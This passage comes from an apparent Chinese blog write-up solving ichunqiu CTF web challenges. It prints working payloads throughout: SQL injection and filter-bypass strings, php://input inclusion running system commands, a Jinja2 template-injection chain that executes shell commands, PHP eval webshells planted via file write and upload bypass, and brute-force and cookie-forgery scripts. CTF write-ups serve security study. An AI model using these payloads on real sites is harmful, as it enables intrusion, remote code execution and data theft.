alt></p><p>我们来分析一下下面这个sql语句真正执行的是什么：</p><pre><code>select count(*) from t_info where username = &apos;or/**/1#1\&apos; or nickname = &apos;or/**/1#1\&apos;</code></pre><p>首先第一个单引号从 <strong>username =</strong> 的后边一直到 <strong>nickname = </strong> 的后边，两个单引号中间虽然还有个单引号<code>1\&#39;</code>，但是这个单引号左边有一个反斜杠，被反斜杠转义了之后就失去了单引号的意义，所以可以认为它不是个单引号。那么两个单引号之间的内容其实都是username的值，而至于语句的最后边<code>#1\&#39;</code>，在sql语句中#代表注释符，#后边的内容都被注释掉了，我们就直接当作后边没有东西，而/*<em>/在sql语句中是注释符，其实就等价于空格，那么这个sql语句整理一下就是这样：<br>    select count(</em>) from t_info where username = ‘A’ or 1</p><p>语句的后边or 1 永远为真，所以可以直接登陆成功。</p><p>然后拿着payload放到网站的登陆框内，点击提交，</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/12.png" alt></p><p>得到flag.</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/13.png" alt></p><h3 id="4-upload"><a href="#4-upload" class="headerlink" title="4.upload"></a>4.upload</h3><p>进去之后显示：<code>Hi,CTFer!u should be a fast man:)</code></p><p>按F12查看网络发现请求头里有个flag字段是base64编码的，那么拿出来对其解码得到一个数，然后我们查看页面的源代码发现有一句话：<code>Please post ichunqiu what you find</code><br>那么我们Post这个参数<code>ichunqiu=前边解码得到的字符串</code><br>然后页面返回<code>Hi,CTFer!u should be a fast man:)</code></p><p>那么上脚本：<br>    import requests<br>    import base64<br>    a = requests.session()<br>    b = a.get(“<a href="http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com//&quot;" target="_blank" rel="noopener">http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com//&quot;</a>)<br>    key1 = b.headers[“flag”]<br>    c = base64.b64decode(key1)<br>    d = str(c).split(‘:’)<br>    key = base64.b64decode(d[1])<br>    body = {“ichunqiu”:key}<br>    f = a.post(“<a href="http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/&quot;,data=body" target="_blank" rel="noopener">http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/&quot;,data=body</a>)<br>    print(f.text)</p><p>得到结果：<br>    Path:3712901a08bb58557943ca31f3487b7d</p><p>访问地址：<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d</code></p><p>我们对目录扫描发现有一个/.svn  有可能是源码泄露，然后对<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn</code>进行目录扫描发现下边有一个wc.db文件，访问一下看到一句话：<code>my username is md5(HEL1OW1OrDEveryOn3)</code><br>将这句话md5加密一下：<code>8638d5263ab0d3face193725c23ce095</code></p><p>然后我们进入登陆页面：<br>password=123456<br>下边还有这句话：<br>    substr(md5(captcha), 0, 6)=da6137</p><p>上脚本，爆破验证码：<br>    import hashlib<br>    def md5(s):<br>        return hashlib.md5(str(s).encode(‘utf-8’)).hexdigest()<br>    def main(s):<br>        for i in range(1,99999999):<br>            if md5(i)[0:6]  == str(s):<br>                print(i)<br>                exit(0)<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:<br>        main(“e34002”)</p><p>获得验证码后点击submit得到这句话<br>    The 7815696ecbf1c96e6894b779456d330e.php:) Welcome 8638d5263ab0d3face193725c23ce095!<br>然后访问url：<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php</code></p><p>进入到一个文件上传的页面，经典的文件上传漏洞，上传一个jpg图片，打开burp suite抓个包将文件名后缀改成pht即可得到flag.</p><h3 id="5-include"><a href="#5-include" class="headerlink" title="5.include"></a>5.include</h3><p>题目内容：没错！就是文件包含漏洞</p><p>进去后看到一串代码：</p><pre><code>&lt;?php show_source(__FILE__);if(isset($_REQUEST[&apos;path&apos;])){    include($_REQUEST[&apos;path&apos;]);}else{    include(&apos;phpinfo.php&apos;);}</code></pre><p>通过代码审计发现可以传入一个参数path，里面的填入的文件路径可以访问，<br>那么试一试传入<code>?path=flag.php</code> 看能不能得到flag 但是发现并不行<br>刚开始没什么头绪，后来想到能不能试一试为协议呢：<br>于是传入参数：<code>?path=php://input</code><br>然后post里面传入一个一句话：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/14.png" alt></p><p>然后访问之后就会看到</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/15.png" alt></p><p>当前路径下有三个文件，然后我们访问一下第一个最有可能的文件：</p><p>利用burpsuite抓包</p><p>仍然利用之前的payload  get传入<code>?path=php://input</code></p><p>post传入<code>&lt;?php system(&#39;cat dle345aae.php&#39;); ?&gt;</code></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/16.png" alt></p><p>然后得到页面返回的flag</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/17.png" alt></p><h3 id="6-攻击"><a href="#6-攻击" class="headerlink" title="6.攻击"></a>6.攻击</h3><p>题目内容：一个ip只有一个机会，哈哈哈。</p><p>进去后就给了源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo &#39;&lt;pre&gt;&#39;;</span><br><span class="line">include(&#39;u&#x2F;ip.php&#39;);</span><br><span class="line">include(&#39;flag.php&#39;);</span><br><span class="line">if (in_array($_SERVER[&#39;REMOTE_ADDR&#39;],$ip))&#123;</span><br><span class="line">  die(&quot;您的ip已进入系统黑名单&quot;);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($ip);</span><br><span class="line"></span><br><span class="line">if ($_POST[substr($flag,5,3)]&#x3D;&#x3D;&#39;attack&#39;)&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;else if (count($_POST)&gt;0)&#123;</span><br><span class="line">  $ip &#x3D; &#39;$ip[]&#x3D;&quot;&#39;.$_SERVER[&#39;REMOTE_ADDR&#39;].&#39;&quot;;&#39;.PHP_EOL; </span><br><span class="line">  file_put_contents(&#39;u&#x2F;ip.php&#39;,$ip,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;&#x2F;pre&gt;&#39;;</span><br></pre></td></tr></table></figure></p><p>代码审计可知：<br>(1)若当前IP与$ip变量的内容相同，则提示信息直接退出。</p><p>(2)当POST中某id的键值等于’attack’时，打印$flag。这个id为$flag的第五个位置开始，长度为3的一个字符串。</p><p>(3)如果不满足(2)，则检查POST的变量个数，大于0则把你当前的IP加入到黑名单中（故一个IP只能攻击一次，失败了就要重新创建题目）</p><p>tips：其实这里用python脚本也可以添加代理，这样如果IP被添加到黑名单的话也不用非要重新创建赛题</p><p>直接献上代码：</p><pre><code>import requests a = &quot;1234567890&quot; data = {} for i in a:     for j in a:         for k in a:             data[i+j+k]=&quot;attack&quot; print(data) r=requests.post(&quot;http://http://af607c7697f54098938c60906d7323ad38823a770723442c.game.ichunqiu.com/&quot;,data=data) print(r.text)</code></pre><p>运行即可得到flag</p><h3 id="7-Fuzz"><a href="#7-Fuzz" class="headerlink" title="7.Fuzz"></a>7.Fuzz</h3><p>利用模糊测试得到参数是name<br>输入?name=test<br>得到<code>Hello test</code></p><p>先给出payload:</p><pre><code>name=%7B%7B &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) %7D%7Dname=%7B%7B config.from_pyfile(&apos;/tmp/owned.cfg&apos;) %7D%7D name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7Dname=%7B%7B%20config[%27RUNCMD%27](%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py%27,shell=True)%20%7D%7Dname=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/get.py%27,shell=True)%20%7D%7D</code></pre><p>还没弄懂什么意思  后边再来解释</p><h3 id="8-Look"><a href="#8-Look" class="headerlink" title="8.Look"></a>8.Look</h3><p>题目内容：我看的见你，你却看不见我。（非隐写）<br>还给了两个提示：</p><pre><code>tips：sql injectiontips2: mysql 字符集</code></pre><p>挺有趣的一道题，注入+getshell<br>进入题目一片空白，查看源代码还是那样<br>看一看请求头发现一个有用的东西</p><p><code>X-HT:VERIFY</code></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/18.png" alt></p><p>提示上说事SQL注入，那么注入用的参数可能就是这个字段，那么我们来试一试：</p><pre><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/?verify=adm</code></pre><p>页面返回：<code>verify error</code><br>说明我们的参数还是有效果的，我的习惯是先试一试万能密码：<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/?verify=&#39;=0%23</code><br>页面返回了一个文件：<br>    next page 5211ec9dde53ee65bb02225117fba1e1.php</p><p>那么我们来访问它一下：<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/5211ec9dde53ee65bb02225117fba1e1.php</code></p><p>页面返回只有一个hello，根据刚才的经验，直接查看请求头看看：</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/19.png" alt></p><p>看到viminfo想到是不是vim备份文件，那么访问一下:</p><p><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/.viminfo</code><br>看到了有用的东西：</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/20.png" alt><br>那么访问一下这个备份文件：<br>    <a href="http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/icq/" target="_blank" rel="noopener">http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/icq/</a></p><p>看到了两行的php代码<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/21.png" alt></p><p>查看一下页面的源代码：<br>看到了完整的php代码：</p><pre><code>&lt;?php$con = mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;&apos;);mysql_query(&quot;set names utf8&quot;);mysql_select_db(&quot;ctf&quot;);if($_SERVER[&quot;REMOTE_ADDR&quot;]==&apos;8.8.8.8&apos;){    $name = addslashes($_GET[&apos;usern3me&apos;]);}else{    if(stripos($_GET[&apos;usern3me&apos;],&apos;Bctf2O16&apos;)!==false){        $name = &apos;FUCK&apos;;    }    else{        $name = addslashes($_GET[&apos;usern3me&apos;]);    }}echo &apos;hello &apos;.$name;$sql = &quot;select * from admin where name=&apos;$name&apos;&quot;;$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){    echo &apos;&lt;br&gt;next ***.php&apos;;}?&gt;</code></pre><p>代码审计可以发现，其实就是要查询Bctf2O16，但是又不能出现这个字符串，根据提示想到mysql字符集<br>于是构造出payload:<br><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=B%C3%87tf2O16</code></p><p>页面返回<br>    hello BÇtf2O16 next c3368f5eb5f8367fd548b228bee69ef2.php</p><p>那么继续查看这个文件<br>    <a href="http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php" target="_blank" rel="noopener">http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php</a></p><p>页面返回了一个php代码：</p><pre><code>&lt;?phpif(isset($_GET[&apos;path&apos;]) &amp;&amp; isset($_GET[&apos;filename&apos;])){    $path = $_GET[&apos;path&apos;];    $name = &quot;upload/&quot;.$_GET[&apos;filename&apos;];}else{    show_source(__FILE__);    exit();}if(strpos($name,&apos;..&apos;) &gt; -1){    echo &apos;WTF&apos;;    exit();}if(strpos($path,&apos;http://127.0.0.1/&apos;) === 0){    file_put_contents($name,file_get_contents($path));}else{    echo &apos;path error&apos;;}?&gt;</code></pre><p>还要代码审计，需要传入一个path变量，里面要有<code>http://127.0.0.1/</code>这个字段，那么我们用url来写入一个一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com&#x2F;c3368f5eb5f8367fd548b228bee69ef2.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;5211ec9dde53ee65bb02225117fba1e1.php?usern3me&#x3D;&lt;?php%2520eval($_POST[c]);?&gt;&amp;filename&#x3D;b.php</span><br></pre></td></tr></table></figure></p><p>访问之后就生成了一个一句话木马，路径就是<code>/upload/bag.php</code><br>上菜刀了，路径是<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/upload/b.php</code><br>密码就是:c</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/22.png" alt></p><p>菜刀连上之后<br>查看一下当前目录下的文件：<br>什么都没有，那么返回到上一个目录，再查看一下有什么文件：</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/23.png" alt></p><p>终于得到了想要的，<code>cat flag_is_here.php</code><br>就有flag了</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/24.png" alt></p><h3 id="9-upload"><a href="#9-upload" class="headerlink" title="9. upload"></a>9. upload</h3><blockquote><p>想怎么传就怎么传，就是这么任性<br>hint:肯定是文件上传了</p></blockquote><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/25.png" alt><br>相信大家看到这个想法都跟我一样，传一个一句话上去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> @eval($_POST[&quot;code&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><br>结果显示上传成功<br>查看页面源代码可以看到上传的路径<code>/u/test.php</code><br>我们查看文件，发现把“&lt;”和”php ”给过滤掉了<br>那我们就很自然的想到PHP的长标签了<br>重新修改代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;PHP&quot;&gt;</span><br><span class="line"> @eval($_POST[&quot;code&quot;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><p>发现上传成功，使用菜刀连接，发现flag.php<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/26.png" alt><br>打开，得到flag<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/27.png" alt></p><h3 id="10-Code"><a href="#10-Code" class="headerlink" title="10. Code"></a>10. Code</h3><blockquote><p>题目内容：考脑洞，你能过么？<br>题目地址：<a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=hei.jpg" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=hei.jpg</a></p></blockquote><p>进入题目后看到一张图片，查看源代码是被BASE64编码了，源码太长就不放了，这里直接放上解码后的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * Date: 2015&#x2F;11&#x2F;16</span><br><span class="line"> * Time: 1:31</span><br><span class="line"> *&#x2F;</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;jpg&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?jpg&#x3D;hei.jpg&#39;);</span><br><span class="line">$file &#x3D; $_GET[&#39;jpg&#39;];</span><br><span class="line">echo &#39;&lt;title&gt;file:&#39;.$file.&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">$file &#x3D; str_replace(&quot;config&quot;,&quot;_&quot;, $file);</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>其实这段代码里面最有用的不是代码而是最容易被忽略掉的注释<br>注释里面有这句话：<code>Created by PhpStorm</code><br>这里脑补一下：用PhpStorm写出来的项目里面都会有/.idea文件,删除之后还会重新创建(当然可以禁止访问)，这就比较有意思了，我们可以访问<code>/.idea/workspace.xml</code><br>在这个页面里发现了两个有用的文件：<code>fl3g_ichuqiu.php   config.php</code><br>我们要的东西有可能就在这两个文件里，那么查看一下源文件：<br>    <a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3g_ichuqiu.php" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3g_ichuqiu.php</a><br>访问之后发现并没有返回什么东西，是不是哪里出错了呢，看一看<code>index.php</code>文件，发现有一行把字符串<code>config</code>替换成了一个下划线<code>_</code><br>那么我们就需要构造URL来访问这个文件，既然config被替换成了下划线，那么payload如下：<br>    <a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</a><br>这样可以访问到这个文件，源码太长，这里还放解码后的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * Date: 2015&#x2F;11&#x2F;16</span><br><span class="line"> * Time: 1:31</span><br><span class="line"> *&#x2F;</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line">include(&#39;config.php&#39;);</span><br><span class="line">function random($length, $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++)&#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($txt,$key)&#123;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .&#x3D; chr(ord($txt[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt &#x3D; $tmp;</span><br><span class="line">    $rnd&#x3D;random(4);</span><br><span class="line">    $key&#x3D;md5($rnd.$key);</span><br><span class="line">    $s&#x3D;0;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;</span><br><span class="line">        $ttmp .&#x3D; $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line">function decrypt($txt,$key)&#123;</span><br><span class="line">    $txt&#x3D;base64_decode($txt);</span><br><span class="line">    $rnd &#x3D; substr($txt,0,4);</span><br><span class="line">    $txt &#x3D; substr($txt,4);</span><br><span class="line">    $key&#x3D;md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s&#x3D;0;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;</span><br><span class="line">        $tmp .&#x3D; $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .&#x3D; chr(ord($tmp[$i])-10);</span><br><span class="line">    &#125;</span><br><span class="line">    return $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; decrypt($_COOKIE[&#39;user&#39;],$key);</span><br><span class="line">if ($username &#x3D;&#x3D; &#39;system&#39;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    setcookie(&#39;user&#39;,encrypt(&#39;guest&#39;,$key));</span><br><span class="line">    echo &quot;╮(╯▽╰)╭&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>代码审计喽<br>其实就是将函数decrypt返回的值传给username。<br>如果username=system，那么输出flag</p><p>所以说，我们现在是需要得到变量key和变量rnd</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/28.png" alt></p><p>然后这里附上得到username值的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $txt1 &#x3D; &#39;guest&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $txt1[$i] &#x3D; chr(ord($txt1[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line">    $cookie_guest &#x3D; &#39;emVTQkZHCh8d&#39;; </span><br><span class="line">    $cookie_guest &#x3D; base64_decode($cookie_guest);</span><br><span class="line">    $rnd &#x3D; substr($cookie_guest,0,4); </span><br><span class="line">    $ttmp &#x3D; substr($cookie_guest,4);</span><br><span class="line">    $key&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $key .&#x3D; ($txt1[$i] ^ $ttmp[$i]);&#x2F;&#x2F;$key&#x3D;md5($rnd.$key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $txt2 &#x3D; &#39;system&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt2); $i++) &#123;</span><br><span class="line">        $txt2[$i] &#x3D; chr(ord($txt2[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $md5 &#x3D; &#39;0123456789abcdef&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($md5); $i++) &#123;</span><br><span class="line">        $key_new &#x3D; $key.$md5[$i];</span><br><span class="line">        $cookie_system&#x3D;&#39;&#39;;</span><br><span class="line">        for ($j &#x3D; 0; $j &lt; strlen($txt2); $j++) &#123;</span><br><span class="line">            $cookie_system .&#x3D; ($key_new[$j] ^ $txt2[$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        $cookie_system &#x3D; base64_encode($rnd.$cookie_system);</span><br><span class="line">        echo $cookie_system.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码运行后会得到一串值</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/29.png" alt></p><p>我们用burpsuite对username的值进行爆破<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/30.png" alt></p><p>爆破会得到一个正确的username的值，然后直接修改后访问就可以得到flag<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/31.png" alt></p><h3 id="11-SQL"><a href="#11-SQL" class="headerlink" title="11.SQL"></a>11.SQL</h3><blockquote><p>题目内容：出题人就告诉你这是个注入，有种别走！</p></blockquote><p>进入后就说flag在数据库中，那就开始注入吧，测试之后发现不需要单引号，那么看看有几个字段，<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 order by 3</code><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/32.png" alt></p><p>发现返回了<code>inj code!</code> 判断肯定是过滤了关键字，那么用注释符绕/<strong>/过：<br>`<a href="http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1</a> or/</strong>/der by 3`</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/33.png" alt><br>页面没有返回，猜测可能是注释符也被过滤了，那就试试<code>&lt;&gt;</code>这个符号<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 or&lt;&gt;der by 3</code><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/35.png" alt><br>成功返回东西，说明这样可以绕过，那么试一下4：<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 or/**/der by 4</code><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/36.png" alt><br>返回为空，说明字段为3.<br>然后开始注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取数据库名：</span><br><span class="line">http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,database(),3</span><br></pre></td></tr></table></figure><br>    数据库：sqli<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/37.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取表名：</span><br><span 